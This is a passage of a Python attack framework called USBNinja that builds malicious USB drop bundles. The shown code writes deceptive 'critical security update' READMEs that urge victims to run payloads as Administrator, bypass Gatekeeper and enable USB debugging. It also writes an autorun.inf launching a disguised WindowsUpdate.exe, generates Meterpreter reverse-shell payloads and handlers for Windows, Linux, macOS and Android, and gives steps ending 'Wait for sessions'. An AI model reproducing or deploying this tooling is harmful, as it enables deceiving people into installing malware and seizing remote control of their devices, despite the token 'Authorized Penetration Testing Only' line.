            print_status(f"Error generating DigiSpark sketch: {str(e)}", "error")

# Social Engineering
class SocialEngineeringDocs:
    @staticmethod
    def create_all(docs_dir: Path):
        """Create all social engineering docs"""
        print_status("Creating social engineering documents...", "info")
        
        try:
            SocialEngineeringDocs._create_readme(docs_dir)
            SocialEngineeringDocs._create_autorun_inf(docs_dir.parent)
            SocialEngineeringDocs._create_android_readme(docs_dir)
            
            print_status("Social engineering docs created", "success")
        except Exception as e:
            print_status(f"Error creating docs: {str(e)}", "error")
    
    @staticmethod
    def _create_readme(docs_dir: Path):
        """Create main README"""
        try:
            readme = "=" * 64 + "\n"
            readme += "         CRITICAL SECURITY UPDATE - ACTION REQUIRED\n"
            readme += "=" * 64 + "\n\n"
            readme += "SECURITY ADVISORY: CVE-2024-CRITICAL\n\n"
            readme += "This USB drive contains mandatory security patches addressing\n"
            readme += "critical vulnerabilities discovered in recent security audits.\n\n"
            readme += "IMMEDIATE ACTION REQUIRED\n\n"
            readme += "INSTALLATION INSTRUCTIONS:\n"
            readme += "=" * 64 + "\n\n"
            readme += "WINDOWS SYSTEMS:\n"
            readme += "   1. Run 'WindowsUpdate.exe' as Administrator\n"
            readme += "   2. Accept User Account Control prompt\n"
            readme += "   3. Installation completes automatically\n\n"
            readme += "LINUX SYSTEMS:\n"
            readme += "   1. Open terminal in payloads directory\n"
            readme += "   2. Run: sudo ./update_installer\n"
            readme += "   3. Enter password when prompted\n\n"
            readme += "macOS SYSTEMS:\n"
            readme += "   1. Open 'Installer' from payloads folder\n"
            readme += "   2. Right-click -> Open (bypass Gatekeeper)\n"
            readme += "   3. Confirm installation\n\n"
            readme += "ANDROID DEVICES:\n"
            readme += "   1. Open 'SystemUpdate.apk'\n"
            readme += "   2. Allow installation from unknown sources\n"
            readme += "   3. Follow installation wizard\n\n"
            readme += "=" * 64 + "\n"
            readme += "(c) 2024 IT Security Division. All rights reserved.\n"
            (docs_dir / "README.txt").write_text(readme)
        except Exception as e:
            print_status(f"Error creating README: {str(e)}", "error")
    
    @staticmethod
    def _create_android_readme(docs_dir: Path):
        """Create Android-specific README"""
        try:
            android_readme = "=" * 64 + "\n"
            android_readme += "         ANDROID SECURITY UPDATE INSTRUCTIONS\n"
            android_readme += "=" * 64 + "\n\n"
            android_readme += "METHOD 1: USB Cable Installation (Recommended)\n"
            android_readme += "-" * 64 + "\n"
            android_readme += "1. Enable USB debugging on your Android device:\n"
            android_readme += "   Settings -> About Phone -> Tap Build Number 7 times\n"
            android_readme += "   Settings -> Developer Options -> Enable USB Debugging\n\n"
            android_readme += "2. Connect device to computer via USB cable\n\n"
            android_readme += "3. On computer, run: ./usb_inject.sh\n\n"
            android_readme += "4. Accept USB debugging prompt on device\n\n"
            android_readme += "METHOD 2: Manual APK Installation\n"
            android_readme += "-" * 64 + "\n"
            android_readme += "1. Copy SystemUpdate.apk to device\n\n"
            android_readme += "2. On device, navigate to Downloads folder\n\n"
            android_readme += "3. Tap SystemUpdate.apk\n\n"
            android_readme += "4. Allow installation from unknown sources if prompted\n\n"
            android_readme += "5. Tap Install and wait for completion\n\n"
            android_readme += "=" * 64 + "\n"
            (docs_dir / "ANDROID_README.txt").write_text(android_readme)
        except Exception as e:
            print_status(f"Error creating Android README: {str(e)}", "error")
    
    @staticmethod
    def _create_autorun_inf(root_dir: Path):
        """Create autorun.inf for Windows"""
        try:
            autorun = "[autorun]\n"
            autorun += "open=payloads\\WindowsUpdate.exe\n"
            autorun += "icon=payloads\\WindowsUpdate.exe,0\n"
            autorun += "action=Install Critical Security Update\n"
            autorun += "label=Security Updates\n"
            (root_dir / "autorun.inf").write_text(autorun)
        except Exception as e:
            print_status(f"Error creating autorun.inf: {str(e)}", "error")

# Main Framework
class USBNinja:
    def __init__(self):
        self.version = "2.0"
        self.msf = MetasploitInterface()
        self.builder = SmartPayloadBuilder(self.msf)
        self.hid = HIDAttackGenerator()
        self.config_dir = Path.home() / ".usbninja"
        self.log_file = self.config_dir / "usbninja.log"
        
        try:
            self.config_dir.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            print_status(f"Warning: Could not create config dir: {str(e)}", "warning")
    
    def log(self, message: str):
        """Log to file with error handling"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.log_file, 'a') as f:
                f.write(f"[{timestamp}] {message}\n")
        except Exception as e:
            print_status(f"Logging error: {str(e)}", "warning")
    
    def check_dependencies(self) -> bool:
        """Check for required tools"""
        print_status("Checking dependencies...", "info")
        
        required = {
            'msfvenom': 'Metasploit Framework',
            'msfconsole': 'Metasploit Console',
            'python3': 'Python 3',
            'adb': 'Android Debug Bridge (for Android)',
        }
        
        all_found = True
        for tool, desc in required.items():
            try:
                result = subprocess.run(['which', tool], capture_output=True, timeout=5)
                found = result.returncode == 0
                
                if found:
                    print_status(f"{desc}: Found", "success")
                else:
                    if tool == 'adb':
                        print_status(f"{desc}: Missing (optional)", "warning")
                    else:
                        print_status(f"{desc}: Missing", "error")
                        all_found = False
            except Exception as e:
                print_status(f"Error checking {tool}: {str(e)}", "warning")
        
        return all_found
    
    def create_usb_bundle(self, output: str, lhost: str, lport: int, 
                         platforms: List[str], launch_handler: bool = True):
        """Create complete USB attack bundle"""
        try:
            print("\n" + Style.BOLD + ("=" * 60) + Style.END)
            print(Style.BOLD + "Creating USBNinja Attack Bundle" + Style.END)
            print(Style.BOLD + ("=" * 60) + Style.END + "\n")
            
            root = Path(output)
            root.mkdir(parents=True, exist_ok=True)
            
            # Create directory structure
            dirs = {
                'payloads': root / 'payloads',
                'hid': root / 'hid_attacks',
                'docs': root / 'docs',
                'exploits': root / 'exploits',
            }
            
            for d in dirs.values():
                d.mkdir(exist_ok=True)
            
            # Generate payloads
            print("\n" + Style.UNDERLINE + "Phase 1: Payload Generation" + Style.END + "\n")
            
            handlers = []
            
            if 'windows' in platforms or 'all' in platforms:
                self.builder.build_windows_payloads(dirs['payloads'], lhost, lport)
                handlers.append({
                    'name': 'Windows Meterpreter',
                    'payload': 'windows/meterpreter/reverse_tcp',
                    'lhost': lhost,
                    'lport': lport
                })
            
            if 'linux' in platforms or 'all' in platforms:
                self.builder.build_linux_payloads(dirs['payloads'], lhost, lport)
                handlers.append({
                    'name': 'Linux Meterpreter',
                    'payload': 'linux/x64/meterpreter/reverse_tcp',
                    'lhost': lhost,
                    'lport': lport + 1
                })
            
            if 'macos' in platforms or 'all' in platforms:
                self.builder.build_macos_payloads(dirs['payloads'], lhost, lport)
                handlers.append({
                    'name': 'macOS Meterpreter',
                    'payload': 'osx/x64/meterpreter/reverse_tcp',
                    'lhost': lhost,
                    'lport': lport + 2
                })
            
            if 'android' in platforms or 'all' in platforms:
                self.builder.build_android_payloads(dirs['payloads'], lhost, lport)
                handlers.append({
                    'name': 'Android Meterpreter',
                    'payload': 'android/meterpreter/reverse_tcp',
                    'lhost': lhost,
                    'lport': lport + 3
                })
            
            # Generate HID attacks
            print("\n" + Style.UNDERLINE + "Phase 2: HID Injection Attacks" + Style.END + "\n")
            target_os = ['windows', 'linux', 'macos', 'android'] if 'all' in platforms else platforms
            self.hid.generate_all(dirs['hid'], lhost, lport, target_os)
            
            # Create social engineering docs
            print("\n" + Style.UNDERLINE + "Phase 3: Social Engineering" + Style.END + "\n")
            SocialEngineeringDocs.create_all(dirs['docs'])
            
            # Create exploit reference
            print("\n" + Style.UNDERLINE + "Phase 4: Exploit Database" + Style.END + "\n")
            ExploitDatabase.create_exploit_reference(dirs['exploits'])
            
            # Create handler script
            print("\n" + Style.UNDERLINE + "Phase 5: Handler Configuration" + Style.END + "\n")
            handler_rc = root / "handler.rc"
            self.msf.create_handler_rc(handlers, handler_rc)
            
            # Create launcher script
            launcher = root / "start_handlers.sh"
            launcher_script = "#!/bin/bash\n"
            launcher_script += "# USBNinja Handler Launcher\n\n"
            launcher_script += 'echo "[*] Starting Metasploit handlers..."\n'
            launcher_script += f'echo "[*] Listening on: {lhost}"\n'
            launcher_script += f'echo "[*] Ports: {lport}-{lport+len(handlers)-1}"\n'
            launcher_script += 'echo ""\n\n'
            launcher_script += "msfconsole -q -r handler.rc\n"
            launcher.write_text(launcher_script)
            launcher.chmod(0o755)
            
            # Print summary
            print("\n" + Style.BOLD + ("=" * 60) + Style.END)
            print(Style.MSF_GREEN + "[+] USBNinja bundle created successfully!" + Style.END)
            print(Style.BOLD + ("=" * 60) + Style.END + "\n")
            
            print(Style.MSF_BLUE + f"[*]{Style.END} Location: {output}")
            print(Style.MSF_BLUE + f"[*]{Style.END} Platforms: {', '.join(platforms)}")
            print(Style.MSF_BLUE + f"[*]{Style.END} Handlers: {len(handlers)}")
            
            print("\n" + Style.UNDERLINE + "Next Steps:" + Style.END + "\n")
            print("  1. Copy bundle to USB drive")
            print(f"  2. Start handlers: {Style.CYAN}cd {output} && ./start_handlers.sh{Style.END}")
            if 'android' in platforms or 'all' in platforms:
                print(f"  3. For Android: {Style.CYAN}cd {output}/payloads && ./usb_inject.sh{Style.END}")
            print("  4. Insert USB into target system")
            print("  5. Wait for sessions...\n")
            
            self.log(f"Bundle created: {output}")
            return True
        except Exception as e:
            print_status(f"Error creating bundle: {str(e)}", "error")
            return False

# Command Line Interface
def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='USBNinja - Advanced USB Attack Automation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:

  Create full USB bundle (all platforms):
    ./usbninja.py create --output /media/usb --lhost 192.168.1.100 --all
  
  Create for specific platforms:
    ./usbninja.py create -o ./usb -l 10.10.14.5 -t windows linux android
  
  Generate HID attacks only:
    ./usbninja.py hid --output ./hid --lhost 192.168.1.100
  
  Check dependencies:
    ./usbninja.py --check

For Authorized Penetration Testing Only
        """
    )
    
    # Global options
    parser.add_argument('--check', action='store_true',
                       help='Check system dependencies')
    parser.add_argument('--version', action='version',
                       version='USBNinja v2.0')
    
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Create command
    create = subparsers.add_parser('create', help='Create USB attack bundle')
    create.add_argument('-o', '--output', required=True,
                       help='Output directory (e.g., /media/usb)')
    create.add_argument('-l', '--lhost', required=True,
                       help='Listener/callback IP address')
    create.add_argument('-p', '--port', type=int, default=4444,
                       help='Listener port (default: 4444)')
    create.add_argument('-t', '--platforms', nargs='+',
                       choices=['windows', 'linux', 'macos', 'android', 'all'],
                       default=['all'],
                       help='Target platforms')
    create.add_argument('--all', action='store_true',
                       help='Target all platforms')
    create.add_argument('--no-launch', action='store_true',
                       help='Do not auto-launch handlers')
    
    # HID command
    hid = subparsers.add_parser('hid', help='Generate HID injection attacks only')
    hid.add_argument('-o', '--output', required=True,
                    help='Output directory')
    hid.add_argument('-l', '--lhost', required=True,
                    help='Callback IP address')
    hid.add_argument('-p', '--port', type=int, default=4444,
                    help='Callback port')
    hid.add_argument('-t', '--targets', nargs='+',
                    choices=['windows', 'linux', 'macos', 'android', 'all'],
                    default=['all'],
                    help='Target OS platforms')
    
    return parser

def main():
    """Main entry point with complete error handling"""
    try:
        # Check if running as root (recommended)
        if os.geteuid() != 0:
            print(Style.MSF_YELLOW + "[!]" + Style.END + " Warning: Not running as root. Some features may not work.\n")
        
        parser = parse_arguments()
        args = parser.parse_args()
        
        # Print banner
        print_banner()
        
        # Initialize framework
        ninja = USBNinja()
        
        # Handle global commands
        if args.check:
            if ninja.check_dependencies():
                print_status("All dependencies satisfied!", "success")
                return 0
            else:
                print_status("Some dependencies are missing", "warning")
                print_status("Install with: apt-get install metasploit-framework adb", "info")
                return 1
        
        if not args.command:
            parser.print_help()
            return 0
        
        # Verify dependencies before proceeding
        if not ninja.check_dependencies():
            print_status("Missing required dependencies. Run with --check", "error")
            return 1
        
        # Handle create command
        if args.command == 'create':
            platforms = ['windows', 'linux', 'macos', 'android'] if args.all or 'all' in args.platforms else args.platforms
            
            success = ninja.create_usb_bundle(
                output=args.output,
                lhost=args.lhost,
                lport=args.port,
                platforms=platforms,
                launch_handler=not args.no_launch
            )
            
            return 0 if success else 1
        
        # Handle HID command
        elif args.command == 'hid':
            targets = ['windows', 'linux', 'macos', 'android'] if 'all' in args.targets else args.targets
            
            output_dir = Path(args.output)
            output_dir.mkdir(parents=True, exist_ok=True)
            
            hid_gen = HIDAttackGenerator()
            hid_gen.generate_all(output_dir, args.lhost, args.port, targets)
            
            print_status(f"HID attacks generated: {args.output}", "success")
            ninja.log(f"HID attacks created: {args.output}")
            return 0
    
    except KeyboardInterrupt:
        print(f"\n{Style.MSF_YELLOW}[!]{Style.END} Operation cancelled by user")
        return 130
    
    except Exception as e:
        print_status(f"Fatal error: {str(e)}", "error")
        import traceback
        print(Style.DIM + traceback.format_exc() + Style.END)
        return 1

if __name__ == '__main__':
    sys.exit(main())
